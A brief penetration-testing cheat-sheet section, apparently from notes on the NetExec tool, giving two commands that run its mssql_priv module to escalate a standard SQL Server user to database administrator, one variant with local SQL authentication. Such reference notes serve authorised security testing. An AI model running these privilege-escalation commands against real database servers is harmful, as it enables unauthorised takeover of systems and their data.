# Privilege Escalation

### Module to privesc from standard user to DBA (Database Administrator)

    nxc mssql <ip> -u user -p password -M mssql_priv

Local SQL credentials

    nxc mssql <ip> -u user -p password -M mssql_priv --local-auth
